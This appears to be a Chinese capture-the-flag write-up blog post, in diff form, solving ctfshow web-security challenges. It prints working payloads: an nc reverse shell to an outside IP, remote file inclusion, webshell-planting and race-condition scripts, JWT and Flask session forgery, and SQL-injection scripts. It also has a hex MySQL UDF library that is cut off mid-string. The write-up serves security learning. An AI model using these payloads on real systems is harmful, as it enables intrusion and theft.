@@ -1,0 +1,890 @@
++++
+title= "Ctfshow中Web应用安全与防护"
+slug= "ctfshow-web-security-defense"
+description= "六六六，个个都是极客少年"
+date= "2025-09-03T22:35:59+08:00"
+lastmod= "2025-09-03T22:35:59+08:00"
+image= ""
+license= ""
+categories= ["ctfshow"]
+tags= ["Mysql","php"]
+
++++
+
+## 说在前面
+
+“啊？还是难了吗，这个是面向高三学生的” 
+
+## Base64编码隐藏
+
+```html
+<script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+        
+            const correctPassword = "Q1RGe2Vhc3lfYmFzZTY0fQ==";
+            const enteredPassword = document.getElementById('password').value;
+            const messageElement = document.getElementById('message');
+            
+            if (btoa(enteredPassword) === correctPassword) {
+                messageElement.textContent = "Login successful! Flag: "+enteredPassword;
+                messageElement.className = "message success";
+            } else {
+                messageElement.textContent = "Login failed! Incorrect password.";
+                messageElement.className = "message error";
+            }
+        });
+</script>
+```
+
+直接一个Base64比较，解码就是flag，但是输入密码也会回显flag
+
+## HTTP头注入
+
+```http
+POST /check.php HTTP/1.1
+Host: 89a121a7-8843-466a-8d2e-587ccfd6ddf3.challenge.ctf.show
+Connection: keep-alive
+Content-Length: 44
+Cache-Control: max-age=0
+sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Origin: https://89a121a7-8843-466a-8d2e-587ccfd6ddf3.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: ctf-show-brower
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://89a121a7-8843-466a-8d2e-587ccfd6ddf3.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
+Cookie: cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs
+
+username=admin&password=CTF%7Beasy_base64%7D
+```
+
+## Base64多层嵌套解码
+
+```js
+<script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            const correctPassword = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU=";
+            
+            function validatePassword(input) {
+                let encoded = btoa(input);
+                encoded = btoa(encoded + 'xH7jK').slice(3);
+                encoded = btoa(encoded.split('').reverse().join(''));
+                encoded = btoa('aB3' + encoded + 'qW9').substr(2);
+                return btoa(encoded) === correctPassword;
+            }
+
+            const enteredPassword = document.getElementById('password').value;
+            const messageElement = document.getElementById('message');
+            
+            if (!validatePassword(enteredPassword)) {
+                e.preventDefault();
+                messageElement.textContent = "Login failed! Incorrect password.";
+                messageElement.className = "message error";
+            }
+        });
+</script>
+```
+
+这就要比第一题复杂多了，慢慢转回来就行了
+
+```python
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+
+import base64
+from itertools import product
+import string
+
+correct_password = "SXpVRlF4TTFVelJtdFNSazB3VTJ4U1UwNXFSWGRVVlZrOWNWYzU="
+B64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+def b64e(s: str) -> str:
+    return base64.b64encode(s.encode()).decode()
+
+def b64d_to_str(s: str) -> str:
+    """稳健的 Base64 解码到 str（自动补 '='）"""
+    for pad in range(3):
+        try:
+            return base64.b64decode(s + "=" * pad).decode()
+        except Exception:
+            continue
+    return base64.b64decode(s + "==").decode()
+
+def forward_js_like(pw: str) -> str:
+    """按题面 JS 的 validatePassword 逻辑正向编码，用来校验"""
+    encoded = b64e(pw)
+    encoded = b64e(encoded + 'xH7jK')[3:]
+    encoded = b64e(encoded[::-1])
+    encoded = b64e('aB3' + encoded + 'qW9')[2:]
+    return b64e(encoded)
+
+def recover_one_password():
+    s3 = base64.b64decode(correct_password).decode()
+
+    s2 = None
+    for x, y in product(B64, repeat=2):
+        t3_full = x + y + s3
+        try:
+            dec = base64.b64decode(t3_full, validate=True).decode()
+        except Exception:
+            continue
+        if dec.startswith('aB3') and dec.endswith('qW9'):
+            s2 = dec[3:-3]     # 去掉前缀 aB3 和后缀 qW9
+            break
+    assert s2 is not None, "无法恢复 s2"
+
+    s1 = b64d_to_str(s2)[::-1]
+
+    candidates = []
+    for a, b, c in product(B64, repeat=3):
+        t1_full = a + b + c + s1
+        try:
+            dec = base64.b64decode(t1_full, validate=True).decode()
+        except Exception:
+            continue
+        if not dec.endswith('xH7jK'):
+            continue
+        s0 = dec[:-5]
+
+        for pad in range(3):
+            try:
+                raw = base64.b64decode(s0 + "=" * pad)
+            except Exception:
+                continue
+            txt = None
+            try:
+                txt = raw.decode('ascii')
+            except Exception:
+                continue
+            if len(txt) == 0:
+                continue
+
+            if txt.isdigit():
+                rank = 0
+            elif txt.isalnum():
+                rank = 1
+            elif all(32 <= ord(ch) < 127 for ch in txt):
+                rank = 2
+            else:
+                continue
+
+            candidates.append((rank, len(txt), txt))
+            break
+
+    assert candidates, "未找到可读的口令候选"
+    candidates.sort()
+    best = candidates[0][2]
+
+    assert forward_js_like(best) == correct_password, "校验失败：请检查实现"
+    return best
+
+if __name__ == "__main__":
+    pw = recover_one_password()
+    print("[+] 找到可用口令：", pw)
+
+```
+
+## HTTPS中间人攻击
+
+GPT一把锁，flag在TLS握手协议解密之后可以拿到
+
+## Cookie伪造
+
+`guest\guest`
+
+```http
+POST /check.php HTTP/1.1
+Host: 9d8d7623-5092-4668-94e4-9a409f8d20a3.challenge.ctf.show
+Connection: keep-alive
+Content-Length: 29
+Cache-Control: max-age=0
+sec-ch-ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "Windows"
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Origin: https://9d8d7623-5092-4668-94e4-9a409f8d20a3.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://9d8d7623-5092-4668-94e4-9a409f8d20a3.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7
+Cookie: cf_clearance=FfFkJ_rCEzOW7OasGYKDaQdTABU_BVynV76XtJXtEMk-1737092124-1.2.1.1-08wtjOyMUOY8ThDT33UiGmkBadSYm33GtZ8UEqnhMYn45iIQYIfmtkdn0rCEq2cLjGXf0XdRXNrM4molLyQ8vDQnKyYt1ixrhYI8wUqSsnE_reHQM3L6B3Gr67nSRP1zSwCAeJEqXOf02wzTlhdAoBkjyG4DbDdMuMDw6HuBeMCHow7p3zZfJTguhcrd.YRyR8ZagXt2h1DBgZSdnioehaLAzj2nA8s1weMd_HWveEI4ls1PWJz.ADM_9UTNjpCJL6Rlu3t3JqrqEctObC1eUoGYZYf3LWHGDpgLNPYoVjs; PHPSESSID=398b19f5557df65b5f09cb1280a1b9a2; role=admin
+
+username=guest&password=guest
+```
+
+## 一句话木马变形
+
+从waf来看更像是PHPjail，用getallhandlers打了半天打不出来，后面还是列目录读取文件成功了
+
+```php
+readfile(next(array_reverse(scandir(__DIR__))));
+```
+
+## 反弹shell构造
+
+直接nc去反弹就好了
+
+```bash
+nc 160.30.231.213 9999 -e /bin/sh
+```
+
+## 管道符绕过过滤
+
+```bash
+ls / | tac f*
+```
+
+## 无字母数字代码执行
+
+去年在校赛出过类似的题目，所以就直接用就好了
+
+```bash
+POST：
+code=$_=[]._;$_=$_['_'];$_++;$_++;$_++;$__=++$_;$_++;$__=++$_.$__;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$__=$__.++$_;$_=_.$__;$$_[_]($$_[__]);
+GET：
+?_=system&__=whoami
+```
+
+## 无字母数字命令执行
+
+看到是system包着的，和上题用eval包着不一样，所以直接去构造一个类似的payload但是依旧不能成功，最后想到执行缓存文件，但是两个都是POST发包，并不好操作，不好可以条件竞争，自己懒的写脚本了，直接放rufeii师傅写的脚本
+
+```python
+import requests
+import concurrent.futures
+
+
+url = "http://e7139a42-6102-4aa6-825e-80292bfb395b.challenge.ctf.show/"
+
+file_content = b"#!/bin/sh\ntac flag.php"
+
+data = {
+    'code': '. /???/????????[@-[]',
+}
+
+def upload_file():
+    files = {
+        'file': ('test.txt', file_content, 'text/plain')
+    }
+    try:
+        response = requests.post(url, files=files, timeout=5)
+        print(f"上传请求返回状态码: {response.status_code}")
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"上传请求失败: {e}")
+        return None
+
+def send_post():
+    try:
+        response = requests.post(url, data=data, timeout=5)
+        print(f"POST 请求返回状态码: {response.status_code}")
+        return response
+    except requests.exceptions.RequestException as e:
+        print(f"POST 请求失败: {e}")
+        return None
+
+
+def race_condition():
+    with concurrent.futures.ThreadPoolExecutor(max_workers=50) as executor:
+        futures = [executor.submit(upload_file) for _ in range(25)]
+        futures.extend([executor.submit(send_post) for _ in range(25)])
+
+        for future in concurrent.futures.as_completed(futures):
+            result = future.result()
+            if result and "flag" in result.text:
+                print("\n--- 成功！可能找到 Flag ---")
+                print(result.text)
+                return True
+
+    return False
+
+print("正在尝试利用条件竞争，请稍候...")
+success = False
+for i in range(50):
+    if race_condition():
+        success = True
+        break
+    print(f"第 {i + 1} 轮尝试失败，继续...")
+
+if not success:
+    print("\n--- 所有尝试均失败 ---")
+```
+
+## 日志文件包含
+
+```http
+POST / HTTP/1.1
+Host: 820776f3-de27-4d0a-8962-aea557a71bbe.challenge.ctf.show
+Connection: keep-alive
+Content-Length: 38
+Cache-Control: max-age=0
+sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+Origin: https://820776f3-de27-4d0a-8962-aea557a71bbe.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: <?=`tac f*`;?>
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-Dest: document
+Referer: https://820776f3-de27-4d0a-8962-aea557a71bbe.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: zh-CN,zh;q=0.9
+sec-fetch-user: ?1
+
+file=%2Fvar%2Flog%2Fnginx%2Faccess.log
+```
+
+## php://filter读取源码
+
+```http
+POST: 
+file=php://filter/convert.base64-encode/resource=db.php
+```
+
+## 远程文件包含（RFI）
+
+```http
+<?echo `tac f*`;?>
+POST:
+?path=http://160.30.231.213:9999/1.txt
+```
+
+## 路径遍历突破
+
+```bash
+?path=var/www/html/../../../../../../../../../../flag.txt
+```
+
+## 临时文件包含
+
+既然没有PHP协议，所以crash遗留文件的方法不行
+
+且不能访问敏感路径，pearcmd的打法也不行
+
+那剩下的只有session文件包含了，其中有一个槽点就是直接`tac\cat`始终不成功，也不知道为什么
+
+```python
+import io
+import requests
+import threading
+
+sessid="wi"
+url="http://5b42f17e-28e7-4048-b6d8-bd6efc3db509.challenge.ctf.show/"
+
+def write(session):
+    while event.is_set():
+        f=io.BytesIO(b'a'*1024*50)
+        r=session.post(
+            url=url,
+            cookies={'PHPSESSID':sessid},
+            data={
+                "PHP_SESSION_UPLOAD_PROGRESS":"<?php file_put_contents('/tmp/shell.php','<?php eval($_POST[\"cmd\"]);');echo hello;?>"
+            },
+            files={"file":('wi.txt',f)}
+        )
+
+def read(session):
+    while event.is_set():
+        payload="?path=/tmp/sess_"+sessid
+        r=session.get(url=url+payload)
+
+        if 'wi.txt' in r.text:
+            print(r.text)
+            event.clear()
+        else :
+            print("nonono")
+
+
+if __name__=='__main__':
+    event=threading.Event()
+    event.set()
+    with requests.session() as sess:
+        for i in range(1,30):
+            threading.Thread(target=write,args=(sess,)).start()
+
+        for i in range(1,30):
+            threading.Thread(target=read,args=(sess,)).start()
+
+```
+
+## Session固定攻击
+
+登陆普通用户之后发送message给admin，返回包里面的sessionid保存下来，换了回到首页就有flag
+
+## JWT令牌伪造
+
+```python
+import jwt
+import base64
+import json
+
+original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6ZmFsc2V9.xtg1ltvVHM1MGPIna6l949dh1FW4Azsb8Kmijbso_XQ"
+
+header_encoded, payload_encoded, signature = original_jwt.split(".")
+header = json.loads(base64.urlsafe_b64decode(header_encoded + "==").decode())
+payload = json.loads(base64.urlsafe_b64decode(payload_encoded + "==").decode())
+
+header["alg"] = "none"
+payload["admin"] = True
+new_header_encoded = base64.urlsafe_b64encode(json.dumps(header).encode()).decode().rstrip("=")
+new_payload_encoded = base64.urlsafe_b64encode(json.dumps(payload).encode()).decode().rstrip("=")
+
+malicious_jwt = f"{new_header_encoded}.{new_payload_encoded}."
+
+print("原始 JWT:", original_jwt)
+print("篡改后的 JWT:", malicious_jwt)
+```
+
+## Flask_Session伪造
+
+```bash
+flask-unsign --decode --cookie 'eyJ1c2VybmFtZSI6Imd1ZXN0In0.aLkwlQ.F1sLIJN3BXxha-9X5QBg3Mo8a9w'
+{'username': 'guest'}
+
+flask-unsign --unsign --cookie 'eyJ1c2VybmFtZSI6Imd1ZXN0In0.aLkwlQ.F1sLIJN3BXxha-9X5QBg3Mo8a9w'
+```
+
+需要找key，可以任意文件读取
+
+```bash
+/proc/self/environ
+/proc/self/cmdline
+
+/app/app.py
+```
+
+读到文件的时候我以为结束了
+
+```python
+# encoding: utf-8
+import re
+import random
+import uuid
+import urllib.request
+from flask import Flask, session, request
+
+app = Flask(__name__)
+random.seed(uuid.getnode())
+app.config['SECRET_KEY'] = str(random.random() * 100)
+print(app.config['SECRET_KEY'])
+app.debug = False
+
+@app.route('/')
+def index():
+    session['username'] = 'guest'
+    return 'CTFshow 网页爬虫系统 读取网页'
+
+@app.route('/read')
+def read():
+    try:
+        url = request.args.get('url')
+        if re.findall('flag', url, re.IGNORECASE):
+            return '禁止访问'
+        res = urllib.request.urlopen(url)
+        return res.read().decode('utf-8', errors='ignore')
+    except Exception as ex:
+        print(str(ex))
+        return '无读取内容可以展示'
+
+@app.route('/flag')
+def flag():
+    if session.get('username') == 'admin':
+        return open('/flag.txt', encoding='utf-8').read()
+    else:
+        return '访问受限'
+
+if __name__ == '__main__':
+    app.run(
+        debug=False,
+        host="0.0.0.0"
+    )
+```
+
+不过他是根据Mac地址伪随机生成的，所以是能够爆破的，但是后来想起来了更好的方法
+
+```
+/sys/class/net/eth0/address
+02:42:ac:0c:00:a4
+```
+
+计算出来之后直接伪造
+
+```python
+import random
+
+mac = "02:42:ac:0c:00:a4"
+mac_int = int(mac.replace(":", ""), 16)
+
+random.seed(mac_int)
+secret_key = str(random.random() * 100)
+
+print("SECRET_KEY:", secret_key)
+"""
+39.76950030416043
+flask-unsign --sign --cookie "{'username': 'admin'}" --secret 39.76950030416043 --no-literal-eval
+"""
+```
+
+## 弱口令爆破
+
+直接爆破就好了，字典都给了
+
+## 联合查询注入
+
+```
+python3 sqlmap.py -u http://449fb045-7770-4b50-a5a8-04d97539a405.challenge.ctf.show/?id=2 -p id --dbs
+
+python3 sqlmap.py -u http://449fb045-7770-4b50-a5a8-04d97539a405.challenge.ctf.show/?id=2 -p id -D ctfshow_page_informations --tables
+
+python3 sqlmap.py -u http://449fb045-7770-4b50-a5a8-04d97539a405.challenge.ctf.show/?id=2 -p id -D ctfshow_page_informations -T users --dump
+```
+
+## 布尔盲注爆破
+
+```http
+POST /login.php HTTP/1.1
+Host: ab9968c6-39ef-4ee3-990b-7a8f808fe9da.challenge.ctf.show
+Connection: keep-alive
+Content-Length: 29
+Cache-Control: max-age=0
+sec-ch-ua: "Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"
+sec-ch-ua-mobile: ?0
+sec-ch-ua-platform: "macOS"
+Origin: https://ab9968c6-39ef-4ee3-990b-7a8f808fe9da.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://ab9968c6-39ef-4ee3-990b-7a8f808fe9da.challenge.ctf.show/
+Accept-Encoding: gzip, deflate, br, zstd
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: PHPSESSID=gg5ag5455snrhoq8jmp1llo710
+
+username=admin' and 1=1#&password=admin
+```
+
+测试出payload之后写个脚本就好了
+
+```python
+import requests
+
+url="http://ab9968c6-39ef-4ee3-990b-7a8f808fe9da.challenge.ctf.show/login.php"
+i=0
+target = ""
+
+while True:
+    i+=1
+    head=32
+    tail=127
+    while head+1 <tail:
+        mid=(tail+head)//2
+        # payload="admin'and (ascii(substr((select database()),{0},1))<{1})#".format(i,mid)
+        # ctfshow_page_informations
+        # payload = "admin'and (ascii(substr((select group_concat(table_name)from information_schema.tables where table_schema='ctfshow_page_informations'),{0},1))<{1})#".format(
+        #     i, mid)
+        # pages,users
+        # payload = "admin'and (ascii(substr((select group_concat(column_name)from information_schema.columns where table_name='users'),{0},1))<{1})#".format(
+        #     i, mid)
+        # USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password
+        payload = "admin'and (ascii(substr((select password from users),{0},1))<{1})#".format(
+                 i, mid)
+        # print(payload)
+        data={
+            "username":payload,
+            "password":"test",
+        }
+        r=requests.post(url,data)
+        if "Invalid username or password" in r.text:
+            head = mid
+        else:
+            tail = mid
+
+    if head != 32:
+        target += chr(head)
+    else:
+        break
+    print(target)
+
+```
+
+## 堆叠注入写Shell
+
+```http
+POST /login.php HTTP/1.1
+Host: fa891933-9420-4e60-b617-bcdedf4c8a5b.challenge.ctf.show
+Cookie: PHPSESSID=37h474av2enn95cihhhjevu5dn
+Content-Length: 100
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://fa891933-9420-4e60-b617-bcdedf4c8a5b.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://fa891933-9420-4e60-b617-bcdedf4c8a5b.challenge.ctf.show/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: close
+
+username=test'; SELECT '<?php phpinfo(); ?>' INTO OUTFILE '/var/www/html/info.php'; --&password=test
+```
+
+实在是没招了，然后fuzz出来了反斜杠有不同回显，那就是很熟练的逃逸`'`了
+
+```bash
+POST /login.php HTTP/1.1
+Host: fa891933-9420-4e60-b617-bcdedf4c8a5b.challenge.ctf.show
+Cookie: PHPSESSID=37h474av2enn95cihhhjevu5dn
+Content-Length: 41
+Cache-Control: max-age=0
+Sec-Ch-Ua: "Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"
+Sec-Ch-Ua-Mobile: ?0
+Sec-Ch-Ua-Platform: "Windows"
+Origin: https://fa891933-9420-4e60-b617-bcdedf4c8a5b.challenge.ctf.show
+Content-Type: application/x-www-form-urlencoded
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Sec-Fetch-Site: same-origin
+Sec-Fetch-Mode: navigate
+Sec-Fetch-User: ?1
+Sec-Fetch-Dest: document
+Referer: https://fa891933-9420-4e60-b617-bcdedf4c8a5b.challenge.ctf.show/
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Priority: u=0, i
+Connection: close
+
+username=\&password=';select(sleep(5))--+
+```
+
+成功睡眠，尝试写入webshell
+
+```
+username=\&password=';select/**/sleep(5)--+
+
+username=\&password=';set/**/global/**/general_log='on';set/**/global/**/general_log_file='/var/www/html/shell.php';--+
+
+username=\&password=';select/**/'<?php/**/@eval($_POST[1]);?>';--+ 
+
+username=\&password=';select/**/'<?php/**/@eval($_POST['1']);?>'/**/into/**/outfile/**/'shell.php'--+
+```
+
+全部都失败了，那还是用权威的时间盲注吧
+
+```
+username=\&password=';select if((ascii(substr((select database()),1,1)))>100,sleep(5),0)#
+
+username=\&password=';select if((ascii(substr((select database()),1,1)))<100,sleep(5),0)#
+```
+
+正确，写个脚本
+
+```python
+import requests
+import time
+
+url = "http://1655fbe1-c591-43ac-b04e-6250ae9488e3.challenge.ctf.show/login.php"
+
+target = ""
+i = 0
+right_time = 2
+
+while True:
+    i += 1
+    head = 32
+    tail = 127
+    while head + 1 < tail:
+        mid = (head + tail) >> 1
+        # payload="';select if((ascii(substr((select database()),{0},1)))<{1},sleep(3),0)#".format(i,mid)
+        # ctfshow_page_informations
+        # payload = "';select if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),{0},1)))<{1},sleep(3),0)#".format(
+        #     i, mid)
+        # pages,users
+        # payload = "';select if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),{0},1)))<{1},sleep(3),0)#".format(
+        #     i, mid)
+        # id,username,password
+        payload = "';select if((ascii(substr((select password from users),{0},1)))<{1},sleep(5),0)#".format(
+            i, mid)
+        # payload = "';select if((ascii(substr((select version()),{0},1)))<{1},sleep(5),0)#".format(
+        #     i, mid)
+        # 10.3.18-MariaDB
+        print(payload)
+        data = {
+            "username": '\\',
+            "password": payload
+        }
+        start_time = time.time()
+        r = requests.post(url, data)
+        last_time = time.time() - start_time
+        if last_time > right_time:
+            tail = mid
+            # print("right")
+        else:
+            head = mid
+            # print("wrong")
+
+    if head != 32:
+        target += chr(head)
+        print(target)
+    else:
+        break
+    print(target)
+
+```
+
+结果是一个假的flag，查一下数据库是10.3.18-MariaDB，得知这个，后来我想到UDF提权也是写入文件和堆叠注入，所以想要尝试一波
+
+```python
+# 参考脚本
+# 环境：Linux/MariaDB
+import requests
+import time
+
+url = "http://1655fbe1-c591-43ac-b04e-6250ae9488e3.challenge.ctf.show/login.php"
+code = '7F454C4602010100000000000000000003003E0001000000800A000000000000400000000000000058180000000000000000000040003800060040001C0019000100000005000000000000000000000000000000000000000000000000000000C414000000000000C41400000000000000002000000000000100000006000000C814000000000000C814200000000000C8142000000000004802000000000000580200000000000000002000000000000200000006000000F814000000000000F814200000000000F814200000000000800100000000000080010000000000000800000000000000040000000400000090010000000000009001000000000000900100000000000024000000000000002400000000000000040000000000000050E574640400000044120000000000004412000000000000441200000000000084000000000000008400000000000000040000000000000051E5746406000000000000000000000000000000000000000000000000000000000000000000000000000000000000000800000000000000040000001400000003000000474E5500D7FF1D94176ABA0C150B4F3694D2EC995AE8E1A8000000001100000011000000020000000700000080080248811944C91CA44003980468831100000013000000140000001600000017000000190000001C0000001E000000000000001F00000000000000200000002100000022000000230000002400000000000000CE2CC0BA673C7690EBD3EF0E78722788B98DF10ED971581CA868BE12BBE3927C7E8B92CD1E7066A9C3F9BFBA745BB073371974EC4345D5ECC5A62C1CC3138AFF3B9FD4A0AD73D1C50B5911FEAB5FBE1200000000000000000000000000000000000000000000000000000000000000000300090088090000000000000000000000000000010000002000000000000000000000000000000000000000250000002000000000000000000000000000000000000000CD00000012000000000000000000000000000000000000001E0100001200000000000000000000000000000000000000620100001200000000000000000000000000000000000000E30000001200000000000000000000000000000000000000B90000001200000000000000000000000000000000000000680100001200000000000000000000000000000000000000160000002200000000000000000000000000000000000000540000001200000000000000000000000000000000000000F00000001200000000000000000000000000000000000000B200000012000000000000000000000000000000000000005A01000012000000000000000000000000000000000000005201000012000000000000000000000000000000000000004C0100001200000000000000000000000000000000000000E800000012000B00D10D000000000000D1000000000000003301000012000B00A90F0000000000000A000000000000001000000012000C00481100000000000000000000000000007800000012000B009F0B0000000000004C00000000000000FF0000001200090088090000000000000000000000000000800100001000F1FF101720000000000000000000000000001501000012000B00130F0000000000002F000000000000008C0100001000F1FF201720000000000000000000000000009B00000012000B00480C0000000000000A000000000000002501000012000B00420F0000000000006700000000000000AA00000012000B00520C00000000000063000000000000005B00000012000B00950B0000000000000A000000000000008E00000012000B00EB0B0000000000005D00000000000000790100001000F1FF101720000000000000000000000000000501000012000B00090F0000000000000A00000000000000C000000012000B00B50C000000000000F100000000000000F700000012000B00A20E00000000000067000000000000003900000012000B004C0B0000000000004900000000000000D400000012000B00A60D0000000000002B000000000000004301000012000B00B30F0000000000005501000000000000005F5F676D6F6E5F73746172745F5F005F66696E69005F5F6378615F66696E616C697A65005F4A765F5265676973746572436C6173736573006C69625F6D7973716C7564665F7379735F696E666F5F696E6974006D656D637079006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974006C69625F6D7973716C7564665F7379735F696E666F007379735F6765745F696E6974007379735F6765745F6465696E6974007379735F67657400676574656E76007374726C656E007379735F7365745F696E6974006D616C6C6F63007379735F7365745F6465696E69740066726565007379735F73657400736574656E76007379735F657865635F696E6974007379735F657865635F6465696E6974007379735F657865630073797374656D007379735F6576616C5F696E6974007379735F6576616C5F6465696E6974007379735F6576616C00706F70656E007265616C6C6F63007374726E6370790066676574730070636C6F7365006C6962632E736F2E36005F6564617461005F5F6273735F7374617274005F656E6400474C4942435F322E322E3500000000000000000000020002000200020002000200020002000200020002000200020001000100010001000100010001000100010001000100010001000100010001000100010001000100010001006F0100001000000000000000751A6909000002009101000000000000F0142000000000000800000000000000F0142000000000007816200000000000060000000200000000000000000000008016200000000000060000000300000000000000000000008816200000000000060000000A0000000000000000000000A81620000000000007000000040000000000000000000000B01620000000000007000000050000000000000000000000B81620000000000007000000060000000000000000000000C01620000000000007000000070000000000000000000000C81620000000000007000000080000000000000000000000D01620000000000007000000090000000000000000000000D816200000000000070000000A0000000000000000000000E016200000000000070000000B0000000000000000000000E816200000000000070000000C0000000000000000000000F016200000000000070000000D0000000000000000000000F816200000000000070000000E00000000000000000000000017200000000000070000000F00000000000000000000000817200000000000070000001000000000000000000000004883EC08E8EF000000E88A010000E8750700004883C408C3FF35F20C2000FF25F40C20000F1F4000FF25F20C20006800000000E9E0FFFFFFFF25EA0C20006801000000E9D0FFFFFFFF25E20C20006802000000E9C0FFFFFFFF25DA0C20006803000000E9B0FFFFFFFF25D20C20006804000000E9A0FFFFFFFF25CA0C20006805000000E990FFFFFFFF25C20C20006806000000E980FFFFFFFF25BA0C20006807000000E970FFFFFFFF25B20C20006808000000E960FFFFFFFF25AA0C20006809000000E950FFFFFFFF25A20C2000680A000000E940FFFFFFFF259A0C2000680B000000E930FFFFFFFF25920C2000680C000000E920FFFFFF4883EC08488B05ED0B20004885C07402FFD04883C408C390909090909090909055803D680C2000004889E5415453756248833DD00B200000740C488D3D2F0A2000E84AFFFFFF488D1D130A20004C8D25040A2000488B053D0C20004C29E348C1FB034883EB014839D873200F1F4400004883C0014889051D0C200041FF14C4488B05120C20004839D872E5C605FE0B2000015B415CC9C3660F1F84000000000048833DC009200000554889E5741A488B054B0B20004885C0740E488D3DA7092000C9FFE00F1F4000C9C39090554889E54883EC3048897DE8488975E0488955D8488B45E08B0085C07421488D0DE7050000488B45D8BA320000004889CE4889C7E89BFEFFFFC645FF01EB04C645FF000FB645FFC9C3554889E548897DF8C9C3554889E54883EC3048897DF8488975F0488955E848894DE04C8945D84C894DD0488D0DCA050000488B45E8BA1F0000004889CE4889C7E846